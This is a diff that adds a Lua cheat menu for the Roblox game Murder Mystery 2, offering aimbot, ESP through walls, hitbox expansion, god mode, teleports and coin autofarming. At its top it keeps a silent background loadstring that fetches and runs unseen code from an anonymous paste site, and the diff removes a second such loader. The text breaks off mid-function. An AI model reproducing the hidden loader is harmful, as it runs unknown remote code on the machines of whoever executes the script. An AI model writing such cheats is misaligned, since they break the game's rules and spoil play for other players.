@@ -1,2 +1,2135 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/lf56qZwtfb/0", true))()
-loadstring(game:HttpGet("https://pastefy.app/F6O92DGj/raw"))()
+-- ============================================================
+--  External loader (kept for compatibility — runs in parallel)
+--  Wrapped in task.spawn + pcall so it never blocks the MM2 Hub below.
+-- ============================================================
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/lf56qZwtfb/0", true))()
+    end)
+end)
+
+-- ============================================================
+--  MM2 HUB — Script complet pour Murder Mystery 2 (Roblox)
+--  UI Library: Wind UI v1.6.x by Footagesus
+--  Repo       : https://github.com/Footagesus/WindUI
+--  Author     : YourName
+--  Game       : https://www.roblox.com/games/142823291
+-- ============================================================
+--
+--  HOW TO RUN:
+--  1) Open Murder Mystery 2 in Roblox
+--  2) Inject your executor (Synapse / Krnl / Fluxus / Wave / Solara...)
+--  3) Execute this script
+--  4) Hotkey: RightControl to open/close the menu
+--
+--  WARNING:
+--  This script is provided for educational purposes. Using exploits
+--  violates the Roblox ToS and may result in a
+--  ban of your account. You are solely responsible for how you use it.
+-- ============================================================
+
+-- ============================================================
+--  1. SERVICES & GLOBAL VARIABLES
+-- ============================================================
+local Players           = game:GetService("Players")
+local LocalPlayer       = Players.LocalPlayer
+local Workspace         = game:GetService("Workspace")
+local RunService        = game:GetService("RunService")
+local UserInputService  = game:GetService("UserInputService")
+local Lighting          = game:GetService("Lighting")
+local StarterGui        = game:GetService("StarterGui")
+local TweenService      = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService       = game:GetService("HttpService")
+local VirtualUser       = game:GetService("VirtualUser")
+local CoreGui           = game:GetService("CoreGui")
+
+local Camera = Workspace.CurrentCamera
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Global state — all toggles/sliders write here
+local State = {
+    -- ESP
+    espEnabled        = false,
+    espNames          = false,
+    espDistance       = false,
+    espTracers        = false,
+    espBox            = false,
+    espMurdColor      = Color3.fromRGB(255, 0, 0),
+    espSherColor      = Color3.fromRGB(0, 80, 255),
+    espInnoColor      = Color3.fromRGB(0, 255, 0),
+    -- Aimbot
+    aimbotEnabled     = false,
+    aimbotFOV         = 90,
+    aimbotSmooth      = 0.15,
+    aimbotTarget      = "Head",      -- "Head" / "Torso" / "HumanoidRootPart"
+    aimbotVisibleOnly = true,
+    aimbotTeamCheck   = true,
+    -- Silent Aim
+    silentAim         = false,
+    silentTarget      = "Closest",   -- "Closest" / "Murderer" / "Sheriff"
+    -- Aimlock
+    aimlockEnabled    = false,
+    aimlockTarget     = nil,         -- Player object
+    -- Player mods
+    flyEnabled        = false,
+    flySpeed          = 25,
+    noclip            = false,
+    speedEnabled      = false,
+    walkSpeed         = 32,
+    jumpPower         = 50,
+    infJump           = false,
+    godMode           = false,
+    -- Visuals
+    fullbright        = false,
+    xray              = false,
+    hitboxExpander    = false,
+    hitboxSize        = 10,
+    hitboxTransparency = 0.5,
+    -- Auto
+    coinFarm          = false,
+    coinFarmSpeed     = 25,    -- default fly speed for coin farm (mobile-friendly)
+    coinFarmMode      = "Fly", -- "Fly" (smooth) or "Teleport" (instant)
+    gunGrabber        = false,
+    autoShoot         = false,
+    -- Notifiers
+    murdererNotify    = true,
+    gunDropNotify     = true,
+    -- ESP des coins
+    coinESP           = false,
+    -- Misc
+    antiAfk           = true,
+    chatCommands      = true,
+}
+
+-- RunService connections storage so we can disconnect them
+local Connections = {}
+local ESPObjects = {}     -- [player] = { billboard, tracer, highlight, ... }
+local CoinESPObjects = {}
+local FOVCircle = nil     -- Drawing.Circle for aimbot
+
+-- ============================================================
+--  2. FONCTIONS UTILITAIRES
+-- ============================================================
+
+-- Returns a player's role based on their inventory
+local function GetRole(player)
+    if not player then return "Innocent" end
+    local char = player.Character
+    local backpack = player:FindFirstChild("Backpack")
+    -- Murderer = a un Knife
+    if (char and char:FindFirstChild("Knife")) or (backpack and backpack:FindFirstChild("Knife")) then
+        return "Murderer"
+    end
+    -- Sheriff / Hero = a un Gun
+    if (char and char:FindFirstChild("Gun")) or (backpack and backpack:FindFirstChild("Gun")) then
+        return "Sheriff"
+    end
+    return "Innocent"
+end
+
+-- Returns the Player object who is the murderer (or nil)
+local function GetMurderer()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and GetRole(p) == "Murderer" then
+            return p
+        end
+    end
+end
+
+-- Returns the Player object who is the sheriff (or nil)
+local function GetSheriff()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and GetRole(p) == "Sheriff" then
+            return p
+        end
+    end
+end
+
+-- Color associated with a role
+local function RoleColor(role)
+    if role == "Murderer" then return State.espMurdColor
+    elseif role == "Sheriff" then return State.espSherColor
+    else return State.espInnoColor end
+end
+
+-- Checks if a position is visible from the camera (raycast)
+local function IsVisible(targetPosition)
+    local origin = Camera.CFrame.Position
+    local direction = (targetPosition - origin)
+    local params = RaycastParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    local ignoreList = { LocalPlayer.Character }
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Character then table.insert(ignoreList, p.Character) end
+    end
+    params.FilterDescendantsInstances = ignoreList
+    local result = Workspace:Raycast(origin, direction, params)
+    return result == nil
+end
+
+-- Finds the closest player to the cursor within the FOV
+local function GetClosestPlayerToCursor(mode)
+    mode = mode or "Closest"
+    local closest, shortest = nil, State.aimbotFOV
+    local center = UserInputService:GetMouseLocation()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local part = p.Character:FindFirstChild(State.aimbotTarget)
+            if part then
+                -- Filter by role if requested
+                if mode == "Murderer" and GetRole(p) ~= "Murderer" then
+                    -- skip
+                elseif mode == "Sheriff" and GetRole(p) ~= "Sheriff" then
+                    -- skip
+                else
+                    local screenPos, onScreen = Camera:WorldToViewportPoint(part.Position)
+                    if onScreen then
+                        local dist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
+                        if dist < shortest then
+                            -- Check visibility if required
+                            if State.aimbotVisibleOnly and not IsVisible(part.Position) then
+                                -- skip
+                            else
+                                shortest = dist
+                                closest = p
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return closest
+end
+
+-- Liste des noms de joueurs (autre que LocalPlayer)
+function GetPlayerList()
+    local list = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then table.insert(list, p.Name) end
+    end
+    return list
+end
+
+-- WindUI notification (with StarterGui fallback if WindUI not loaded yet)
+local function Notify(title, content, duration, icon)
+    duration = duration or 4
+    icon = icon or "solar:bell-bold"
+    if _G.WindUI then
+        _G.WindUI:Notify({
+            Title = title,
+            Content = content,
+            Duration = duration,
+            Icon = icon,
+        })
+    else
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = title,
+                Text = content,
+                Duration = duration,
+            })
+        end)
+    end
+end
+
+-- ============================================================
+--  3. LOADING WIND UI
+-- ============================================================
+local WindUI
+local ok, err = pcall(function()
+    WindUI = loadstring(game:HttpGet(
+        "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
+    ))()
+end)
+if not ok or not WindUI then
+    warn("[MM2 Hub] Failed to load Wind UI (release URL): " .. tostring(err))
+    -- Retry avec la raw URL de la branche main
+    pcall(function()
+        WindUI = loadstring(game:HttpGet(
+            "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"
+        ))()
+    end)
+end
+if not WindUI then
+    warn("[MM2 Hub] Total failure loading Wind UI")
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "MM2 Hub",
+            Text = "Wind UI error: " .. tostring(err),
+            Duration = 10,
+        })
+    end)
+    return
+end
+_G.WindUI = WindUI
+print("[MM2 Hub] WindUI loaded successfully — v" .. tostring(WindUI.Version))
+
+-- ============================================================
+--  4. CREATING THE WINDOW
+-- ============================================================
+-- Detect mobile/touch devices for adaptive UI
+local IsMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+local Window = WindUI:CreateWindow({
+    Title        = "MM2 HUB",
+    Author       = "by You — WindUI v" .. tostring(WindUI.Version or "?") .. (IsMobile and " [Mobile]" or ""),
+    Icon         = "solar:knife-bold-duotone",
+    IconSize     = 20,
+    Folder       = "MM2Hub",
+    Theme        = "Dark",
+    Size         = IsMobile and UDim2.fromOffset(380, 520) or UDim2.fromOffset(640, 500),
+    MinSize      = Vector2.new(320, 360),
+    MaxSize      = Vector2.new(900, 720),
+    ToggleKey    = Enum.KeyCode.RightControl,
+    Transparent  = false,
+    Resizable    = true,
+    SideBarWidth = IsMobile and 140 or 200,
+    Radius       = 16,
+    ElementsRadius = 8,
+    Acrylic      = false,
+    AutoScale    = true,
+    HideSearchBar = false,
+    OpenButton   = {
+        Title = "MM2",
+        Icon  = "solar:knife-bold-duotone",
+        Enabled = true,
+        Draggable = true,
+        OnlyMobile = false,
+        CornerRadius = UDim.new(1, 0),
+        Scale = IsMobile and 1.0 or 0.85,
+    },
+})
+
+-- Version badge
+Window:Tag({
+    Title = "v1.0",
+    Icon  = "github",
+    Color = Color3.fromHex("#1c1c1c"),
+    Border = true,
+})
+
+-- ============================================================
+--  5. TABS
+-- ============================================================
+local TabCombat    = Window:Tab({ Title = "Combat",    Icon = "solar:sword-bold",         IconShape = "Square", Border = true, ShowTabTitle = true })
+local TabVisuals   = Window:Tab({ Title = "Visuals",   Icon = "solar:eye-bold",           IconShape = "Square", Border = true, ShowTabTitle = true })
+local TabPlayer    = Window:Tab({ Title = "Player",    Icon = "solar:user-bold",          IconShape = "Square", Border = true, ShowTabTitle = true })
+local TabTeleport  = Window:Tab({ Title = "Teleport",  Icon = "solar:map-point-bold",     IconShape = "Square", Border = true, ShowTabTitle = true })
+local TabAuto      = Window:Tab({ Title = "Auto",      Icon = "solar:bot-bold",           IconShape = "Square", Border = true, ShowTabTitle = true })
+local TabNotify    = Window:Tab({ Title = "Notifiers", Icon = "solar:bell-bing-bold",     IconShape = "Square", Border = true, ShowTabTitle = true })
+local TabSettings  = Window:Tab({ Title = "Settings",  Icon = "solar:settings-bold",      IconShape = "Square", Border = true, ShowTabTitle = true })
+
+-- ============================================================
+--  6. TAB: COMBAT (Aimbot, Silent Aim, Aimlock)
+-- ============================================================
+local SecAimbot = TabCombat:Section({ Title = "Aimbot", Desc = "Automatically aims at the enemy's head", Box = true, Opened = true })
+
+SecAimbot:Toggle({
+    Title = "Activer l'Aimbot",
+    Desc = "Locks the camera onto the closest target to the cursor",
+    Value = false,
+    Callback = function(v) State.aimbotEnabled = v end,
+})
+
+SecAimbot:Slider({
+    Title = "FOV (radius in px)",
+    Step = 1,
+    Value = { Min = 10, Max = 500, Default = 90 },
+    Callback = function(v)
+        State.aimbotFOV = v
+        if FOVCircle then FOVCircle.Radius = v end
+    end,
+})
+
+SecAimbot:Slider({
+    Title = "Smoothness",
+    Desc = "Higher = smoother (0 = instant)",
+    Step = 0.01,
+    Value = { Min = 0, Max = 1, Default = 0.15 },
+    Callback = function(v) State.aimbotSmooth = v end,
+})
+
+SecAimbot:Dropdown({
+    Title = "Target part",
+    Values = { "Head", "Torso", "HumanoidRootPart" },
+    Value = "Head",
+    Callback = function(opt) State.aimbotTarget = opt end,
+})
+
+SecAimbot:Toggle({
+    Title = "Visible only",
+    Desc = "Only aim at enemies not blocked by a wall",
+    Value = true,
+    Callback = function(v) State.aimbotVisibleOnly = v end,
+})
+
+SecAimbot:Toggle({
+    Title = "Draw FOV circle",
+    Value = true,
+    Callback = function(v)
+        if v then
+            if not FOVCircle and Drawing then
+                FOVCircle = Drawing.new("Circle")
+                FOVCircle.Radius = State.aimbotFOV
+                FOVCircle.Thickness = 2
+                FOVCircle.Color = Color3.fromRGB(255, 0, 0)
+                FOVCircle.Filled = false
+                FOVCircle.Visible = true
+            end
+            if FOVCircle then FOVCircle.Visible = true end
+        else
+            if FOVCircle then FOVCircle.Visible = false end
+        end
+    end,
+})
+
+local SecSilent = TabCombat:Section({ Title = "Silent Aim", Desc = "Bullets hit the target without moving the camera (advanced)", Box = true, Opened = false })
+
+SecSilent:Toggle({
+    Title = "Activer le Silent Aim",
+    Desc = "Requires an executor with hookmetamethod",
+    Value = false,
+    Callback = function(v) State.silentAim = v end,
+})
+
+SecSilent:Dropdown({
+    Title = "Priority target",
+    Values = { "Closest", "Murderer", "Sheriff" },
+    Value = "Closest",
+    Callback = function(opt) State.silentTarget = opt end,
+})
+
+local SecAimlock = TabCombat:Section({ Title = "Aimlock", Desc = "Locks the camera onto a specific player", Box = true, Opened = false })
+
+local AimlockTargetInput = nil
+SecAimlock:Toggle({
+    Title = "Activer l'Aimlock",
+    Desc = "Locks onto the player entered below",
+    Value = false,
+    Callback = function(v)
+        State.aimlockEnabled = v
+        if v and AimlockTargetInput then
+            local name = AimlockTargetInput.Value or ""
+            State.aimlockTarget = Players:FindFirstChild(name)
+        end
+    end,
+})
+
+AimlockTargetInput = SecAimlock:Input({
+    Title = "Target player name",
+    Placeholder = "ex: Player1",
+    Callback = function(text)
+        State.aimlockTarget = Players:FindFirstChild(text)
+    end,
+})
+
+-- ============================================================
+--  7. TAB: VISUALS (ESP, X-Ray, Fullbright, Hitbox)
+-- ============================================================
+local SecESP = TabVisuals:Section({ Title = "ESP — Role-based", Desc = "See players through walls, colored by role", Box = true, Opened = true })
+
+SecESP:Toggle({
+    Title = "ESP Enabled",
+    Desc = "Shows a colored dot above each player",
+    Value = false,
+    Callback = function(v)
+        State.espEnabled = v
+        if v then ApplyESP() else ClearESP() end
+    end,
+})
+
+SecESP:Toggle({
+    Title = "Show names",
+    Value = true,
+    Callback = function(v)
+        State.espNames = v
+        if State.espEnabled then ApplyESP() end
+    end,
+})
+
+SecESP:Toggle({
+    Title = "Show distance",
+    Value = false,
+    Callback = function(v)
+        State.espDistance = v
+        if State.espEnabled then ApplyESP() end
+    end,
+})
+
+SecESP:Toggle({
+    Title = "Tracers (lines)",
+    Desc = "Draws a line from the bottom of the screen to each player",
+    Value = false,
+    Callback = function(v)
+        State.espTracers = v
+        if State.espEnabled then ApplyESP() end
+    end,
+})
+
+SecESP:Toggle({
+    Title = "Boxes",
+    Value = false,
+    Callback = function(v)
+        State.espBox = v
+        if State.espEnabled then ApplyESP() end
+    end,
+})
+
+-- Colorpickers for each role
+SecESP:Colorpicker({
+    Title = "Murderer color",
+    Default = Color3.fromRGB(255, 0, 0),
+    Callback = function(c)
+        State.espMurdColor = c
+        if State.espEnabled then ApplyESP() end
+    end,
+})
+
+SecESP:Colorpicker({
+    Title = "Sheriff color",
+    Default = Color3.fromRGB(0, 80, 255),
+    Callback = function(c)
+        State.espSherColor = c
+        if State.espEnabled then ApplyESP() end
+    end,
+})
+
+SecESP:Colorpicker({
+    Title = "Innocent color",
+    Default = Color3.fromRGB(0, 255, 0),
+    Callback = function(c)
+        State.espInnoColor = c
+        if State.espEnabled then ApplyESP() end
+    end,
+})
+
+local SecWorld = TabVisuals:Section({ Title = "World", Box = true, Opened = true })
+
+SecWorld:Toggle({
+    Title = "Fullbright",
+    Desc = "Lights up the entire map (modifies Lighting)",
+    Value = false,
+    Callback = function(v)
+        State.fullbright = v
+        if v then EnableFullbright() else DisableFullbright() end
+    end,
+})
+
+SecWorld:Toggle({
+    Title = "X-Ray",
+    Desc = "Makes walls transparent",
+    Value = false,
+    Callback = function(v)
+        State.xray = v
+        if v then EnableXray(Workspace) else DisableXray(Workspace) end
+    end,
+})
+
+SecWorld:Toggle({
+    Title = "Coin ESP",
+    Desc = "Highlights all coins on the map",
+    Value = false,
+    Callback = function(v)
+        State.coinESP = v
+        if v then ApplyCoinESP() else ClearCoinESP() end
+    end,
+})
+
+local SecHitbox = TabVisuals:Section({ Title = "Hitbox Expander", Desc = "Enlarges enemy hitboxes", Box = true, Opened = false })
+
+SecHitbox:Toggle({
+    Title = "Activer",
+    Value = false,
+    Callback = function(v) State.hitboxExpander = v end,
+})
+
+SecHitbox:Slider({
+    Title = "Taille",
+    Step = 1,
+    Value = { Min = 2, Max = 50, Default = 10 },
+    Callback = function(v) State.hitboxSize = v end,
+})
+
+SecHitbox:Slider({
+    Title = "Transparency",
+    Step = 0.05,
+    Value = { Min = 0, Max = 1, Default = 0.5 },
+    Callback = function(v) State.hitboxTransparency = v end,
+})
+
+-- ============================================================
+--  8. TAB: PLAYER (Fly, Noclip, Speed, Jump, Godmode)
+-- ============================================================
+local SecFly = TabPlayer:Section({ Title = "Fly", Box = true, Opened = true })
+
+SecFly:Toggle({
+    Title = "Enable Fly",
+    Desc = "Use W/A/S/D + Space/Shift",
+    Value = false,
+    Callback = function(v)
+        State.flyEnabled = v
+        if v then StartFly() else StopFly() end
+    end,
+})
+
+SecFly:Slider({
+    Title = "Fly speed",
+    Step = 1,
+    Value = { Min = 5, Max = 300, Default = 25 },
+    Callback = function(v)
+        State.flySpeed = v
+    end,
+})
+
+if IsMobile then
+    SecFly:Paragraph({
+        Title = "Mobile Fly",
+        Desc = "On mobile, enable 'Mobile Fly Controls' in Settings to show on-screen W/A/S/D + UP/DN buttons.",
+        Image = "solar:device-mobile-bold",
+        ImageSize = 22,
+    })
+end
+
+local SecMovement = TabPlayer:Section({ Title = "Movement", Box = true, Opened = true })
+
+SecMovement:Toggle({
+    Title = "Noclip",
+    Desc = "Walk through walls",
+    Value = false,
+    Callback = function(v) State.noclip = v end,
+})
+
+SecMovement:Toggle({
+    Title = "Modified WalkSpeed",
+    Value = false,
+    Callback = function(v)
+        State.speedEnabled = v
+        if v then ApplyWalkSpeed() else ResetWalkSpeed() end
+    end,
+})
+
+SecMovement:Slider({
+    Title = "WalkSpeed",
+    Step = 1,
+    Value = { Min = 16, Max = 200, Default = 32 },
+    Callback = function(v)
+        State.walkSpeed = v
+        if State.speedEnabled then ApplyWalkSpeed() end
+    end,
+})
+
+SecMovement:Toggle({
+    Title = "Modified Jump Power",
+    Value = false,
+    Callback = function(v)
+        if v then ApplyJumpPower() else ResetJumpPower() end
+    end,
+})
+
+SecMovement:Slider({
+    Title = "Jump Power",
+    Step = 1,
+    Value = { Min = 50, Max = 500, Default = 100 },
+    Callback = function(v)
+        State.jumpPower = v
+        ApplyJumpPower()
+    end,
+})
+
+SecMovement:Toggle({
+    Title = "Infinite jump",
+    Desc = "Jump in the air indefinitely",
+    Value = false,
+    Callback = function(v) State.infJump = v end,
+})
+
+local SecGod = TabPlayer:Section({ Title = "God Mode", Desc = "Immortality (do not reset while active)", Box = true, Opened = false })
+
+SecGod:Button({
+    Title = "Enable God Mode",
+    Icon = "solar:shield-bold",
+    Callback = function()
+        EnableGodMode()
+    end,
+})
+
+-- ============================================================
+--  9. TAB: TELEPORT
+-- ============================================================
+local SecTPPlayer = TabTeleport:Section({ Title = "To a player", Box = true, Opened = true })
+
+local PlayerDropdown = SecTPPlayer:Dropdown({
+    Title = "Target player",
+    Values = GetPlayerList(),
+    SearchBarEnabled = true,
+    Callback = function(opt) _G.TPTargetName = opt end,
+})
+
+SecTPPlayer:Button({
+    Title = "Teleport to player",
+    Icon = "solar:map-point-bold",
+    Callback = function()
+        local name = _G.TPTargetName
+        if name and Players:FindFirstChild(name) then
+            TeleportToPlayer(Players[name])
+        else
+            Notify("Teleport", "Player not found", 3, "solar:warning-bold")
+        end
+    end,
+})
+
+SecTPPlayer:Button({
+    Title = "Refresh list",
+    Callback = function()
+        PlayerDropdown:Refresh(GetPlayerList())
+    end,
+})
+
+local SecTPRoles = TabTeleport:Section({ Title = "To roles", Box = true, Opened = true })
+
+SecTPRoles:Button({
+    Title = "Teleport to Murderer",
+    Icon = "solar:knife-bold",
+    Color = Color3.fromRGB(255, 50, 50),
+    Callback = function()
+        local m = GetMurderer()
+        if m then TeleportToPlayer(m, 5)
+        else Notify("Teleport", "No murderer detected", 3, "solar:warning-bold") end
+    end,
+})
+
+SecTPRoles:Button({
+    Title = "Teleport to Sheriff",
+    Icon = "solar:hand-stars-bold",
+    Color = Color3.fromRGB(50, 100, 255),
+    Callback = function()
+        local s = GetSheriff()
+        if s then TeleportToPlayer(s, 5)
+        else Notify("Teleport", "No sheriff detected", 3, "solar:warning-bold") end
+    end,
+})
+
+local SecTPLocations = TabTeleport:Section({ Title = "Locations", Box = true, Opened = true })
+
+SecTPLocations:Button({
+    Title = "Teleport to Lobby",
+    Icon = "solar:home-2-bold",
+    Callback = function() TeleportToLobby() end,
+})
+
+SecTPLocations:Button({
+    Title = "Teleport to map spawn",
+    Icon = "solar:map-point-bold",
+    Callback = function() TeleportToMapSpawn() end,
+})
+
+SecTPLocations:Button({
+    Title = "Teleport to GunDrop",
+    Icon = "solar:hand-stars-bold",
+    Callback = function()
+        local gd = Workspace:FindFirstChild("GunDrop")
+        if gd then
+            LocalPlayer.Character.HumanoidRootPart.CFrame = gd.CFrame
+            Notify("Teleport", "Teleported to GunDrop", 3, "solar:check-circle-bold")
+        else
+            Notify("Teleport", "No GunDrop found", 3, "solar:warning-bold")
+        end
+    end,
+})
+
+-- ============================================================
+--  10. TAB: AUTO (Coin farm, Gun grabber, Auto-shoot)
+-- ============================================================
+local SecCoin = TabAuto:Section({ Title = "Coin Farmer", Desc = "Collects all coins on the map automatically", Box = true, Opened = true })
+
+SecCoin:Toggle({
+    Title = "Enable Coin Farm",
+    Desc = "Warning: may be detected by anticheat — use with caution",
+    Value = false,
+    Callback = function(v)
+        State.coinFarm = v
+        if v then StartCoinFarm() end
+    end,
+})
+
+SecCoin:Dropdown({
+    Title = "Collection mode",
+    Values = { "Fly", "Teleport" },
+    Value = "Fly",
+    Callback = function(opt) State.coinFarmMode = opt end,
+})
+
+SecCoin:Slider({
+    Title = "Fly speed during autofarm",
+    Desc = "Studs per second (used only in Fly mode)",
+    Step = 5,
+    Value = { Min = 10, Max = 200, Default = 25 },
+    Callback = function(v) State.coinFarmSpeed = v end,
+})
+
+SecCoin:Button({
+    Title = "Collect coins now",
+    Callback = function()
+        local coins = GetCoins()
+        if #coins == 0 then
+            Notify("Coin Farm", "No coins detected. Wait for a round to start.", 4, "solar:warning-bold")
+            return
+        end
+        Notify("Coin Farm", "Found " .. #coins .. " coins. Collecting...", 3, "solar:check-circle-bold")
+        _G.CollectingOnce = true
+        task.spawn(function()
+            pcall(CollectCoinsOnce)
+            _G.CollectingOnce = false
+        end)
+    end,
+})
+
+SecCoin:Button({
+    Title = "Debug: show coin count",
+    Callback = function()
+        local coins = GetCoins()
+        Notify("Coin Farm", "Coins detected on the map: " .. #coins, 5, "solar:info-circle-bold")
+        print("[MM2 Hub] Coins detected: " .. #coins)
+        for i, c in ipairs(coins) do
+            if i > 5 then break end
+            print("  - " .. c:GetFullName() .. " at " .. tostring(c.Position))
+        end
+    end,
+})
+
+local SecGun = TabAuto:Section({ Title = "Gun Drop Grabber", Desc = "Automatically grabs the GunDrop", Box = true, Opened = false })
+
+SecGun:Toggle({
+    Title = "Auto-grab GunDrop",
+    Value = false,
+    Callback = function(v) State.gunGrabber = v end,
+})
+
+SecGun:Button({
+    Title = "Grab now",
+    Callback = function() GrabGunDrop() end,
+})
+
+local SecAutoShoot = TabAuto:Section({ Title = "Auto-Shoot Murderer", Desc = "Automatically shoots the murderer (you must be Sheriff)", Box = true, Opened = false })
+
+SecAutoShoot:Toggle({
+    Title = "Enable auto-shoot",
+    Value = false,
+    Callback = function(v) State.autoShoot = v end,
+})
+
+SecAutoShoot:Button({
+    Title = "Shoot now",
+    Callback = function() ShootMurderer() end,
+})
+
+-- ============================================================
+--  11. TAB: NOTIFIERS
+-- ============================================================
+local SecNotif = TabNotify:Section({ Title = "Alerts", Box = true, Opened = true })
+
+SecNotif:Toggle({
+    Title = "Notify when the murderer is identified",
+    Value = true,
+    Callback = function(v) State.murdererNotify = v end,
+})
+
+SecNotif:Toggle({
+    Title = "Notify when a GunDrop appears",
+    Value = true,
+    Callback = function(v) State.gunDropNotify = v end,
+})
+
+SecNotif:Button({
+    Title = "Identify the Murderer now",
+    Icon = "solar:knife-bold",
+    Callback = function()
+        local m = GetMurderer()
+        if m then
+            Notify("Murderer detected", "The murderer is " .. m.Name, 8, "solar:knife-bold")
+        else
+            Notify("Murderer", "No murderer detected yet", 4, "solar:warning-bold")
+        end
+    end,
+})
+
+SecNotif:Button({
+    Title = "Identify the Sheriff now",
+    Icon = "solar:hand-stars-bold",
+    Callback = function()
+        local s = GetSheriff()
+        if s then
+            Notify("Sheriff detected", "The sheriff is " .. s.Name, 8, "solar:hand-stars-bold")
+        else
+            Notify("Sheriff", "No sheriff detected yet", 4, "solar:warning-bold")
+        end
+    end,
+})
+
+SecNotif:Button({
+    Title = "Role list (in the F9 console)",
+    Callback = function()
+        print("=========== MM2 — Role list ===========")
+        for _, p in ipairs(Players:GetPlayers()) do
+            print(p.Name .. " — " .. GetRole(p))
+        end
+        print("=============================================")
+        Notify("Console", "List printed in the F9 console", 4, "solar:document-bold")
+    end,
+})
+
+-- ============================================================
+--  12. TAB: SETTINGS
+-- ============================================================
+local SecTheme = TabSettings:Section({ Title = "Theme", Box = true, Opened = true })
+
+local themes = { "Dark", "Light", "Rose", "Plant", "Red", "Indigo", "Sky", "Violet", "Amber", "Emerald", "Midnight", "Crimson", "Monokai Pro", "Cotton Candy", "Mellowsi", "Rainbow" }
+SecTheme:Dropdown({
+    Title = "Choose a theme",
+    Values = themes,
+    Value = "Dark",
+    Callback = function(opt) WindUI:SetTheme(opt) end,
+})
+
+local SecUISet = TabSettings:Section({ Title = "Interface", Box = true, Opened = true })
+
+SecUISet:Keybind({
+    Title = "Open/Close hotkey",
+    Value = "RightControl",
+    CanChange = true,
+    Callback = function(keyName)
+        local kc = Enum.KeyCode[keyName]
+        if kc then Window:SetToggleKey(kc) end
+    end,
+})
+
+SecUISet:Slider({
+    Title = "UI scale",
+    Step = 0.05,
+    Value = { Min = 0.5, Max = 1.5, Default = 1 },
+    Callback = function(v) Window:SetUIScale(v) end,
+})
+
+SecUISet:Toggle({
+    Title = "Acrylic (blur effect)",
+    Value = false,
+    Callback = function(v) WindUI:ToggleAcrylic(v) end,
+})
+
+SecUISet:Toggle({
+    Title = "Notifications at the bottom",
+    Value = false,
+    Callback = function(v) WindUI:SetNotificationLower(v) end,
+})
+
+local SecMisc = TabSettings:Section({ Title = "Misc", Box = true, Opened = true })
+
+SecMisc:Toggle({
+    Title = "Anti-AFK",
+    Value = true,
+    Callback = function(v) State.antiAfk = v end,
+})
+
+SecMisc:Toggle({
+    Title = "Mobile Fly Controls",
+    Desc = IsMobile and "Show on-screen D-pad for fly (touch devices)" or "Show on-screen D-pad for fly (only affects touch devices)",
+    Value = IsMobile,
+    Callback = function(v)
+        State.mobileFlyControls = v
+        UpdateMobileFlyVisibility()
+    end,
+})
+
+SecMisc:Toggle({
+    Title = "Chat commands (/fly /noclip /esp /tp Name)",
+    Value = true,
+    Callback = function(v) State.chatCommands = v end,
+})
+
+SecMisc:Button({
+    Title = "Copy server ID",
+    Callback = function()
+        if setclipboard then
+            setclipboard(game.JobId)
+            Notify("Copied", "Server ID copied to clipboard", 3, "solar:copy-bold")
+        end
+    end,
+})
+
+SecMisc:Button({
+    Title = "Join a new server",
+    Callback = function()
+        Window:Dialog({
+            Title = "Server hop",
+            Content = "Join a different server?",
+            Buttons = {
+                { Title = "Yes", Variant = "Primary", Callback = function() HopServer() end },
+                { Title = "No", Variant = "Tertiary", Callback = function() end },
+            },
+        })
+    end,
+})
+
+SecMisc:Button({
+    Title = "Destroy UI",
+    Callback = function()
+        Window:Dialog({
+            Title = "Confirm",
+            Content = "Permanently destroy the interface?",
+            Buttons = {
+                { Title = "Yes", Variant = "Primary", Callback = function()
+                    Cleanup()
+                    Window:Destroy()
+                end },
+                { Title = "No", Variant = "Tertiary", Callback = function() end },
+            },
+        })
+    end,
+})
+
+local SecAbout = TabSettings:Section({ Title = "About", Box = true, Opened = false })
+
+SecAbout:Paragraph({
+    Title = "MM2 HUB",
+    Desc = "Complete script for Murder Mystery 2 using Wind UI.\nWindUI v" .. (WindUI.Version or "?") .. " — by Footagesus.\nPlaceId: 142823291",
+    Image = "solar:info-circle-bold",
+    ImageSize = 24,
+    Buttons = {
+        {
+            Title = "Open WindUI Docs",
+            Icon = "github",
+            Callback = function()
+                if setclipboard then
+                    setclipboard("https://footagesus.github.io/WindUI-Docs/docs")
+                    Notify("Link", "URL copied to clipboard", 3, "solar:link-bold")
+                end
+            end,
+        },
+    },
+})
+
+-- ============================================================
+--  12.5 MOBILE FLY CONTROLS (on-screen D-pad for touch devices)
+-- ============================================================
+-- Touch-friendly buttons that simulate W/A/S/D + Space/Shift for the fly.
+-- Auto-shown only on mobile/touch devices when State.mobileFlyControls is on.
+local MobileFlyGui = nil
+local MobileButtons = {}
+
+local function CreateMobileButton(parent, text, key, position, size)
+    local btn = Instance.new("TextButton")
+    btn.Name = "Btn_" .. key
+    btn.Text = text
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 22
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    btn.BackgroundTransparency = 0.25
+    btn.Position = position
+    btn.Size = size
+    btn.AutoButtonColor = true
+    btn.Parent = parent
+
+    -- Rounded corners
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0.3, 0)
+    corner.Parent = btn
+
+    -- Stroke
+    local stroke = Instance.new("UIStroke")
+    stroke.Thickness = 1.5
+    stroke.Color = Color3.fromRGB(255, 255, 255)
+    stroke.Transparency = 0.7
+    stroke.Parent = btn
+
+    -- Touch handlers
+    btn.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch
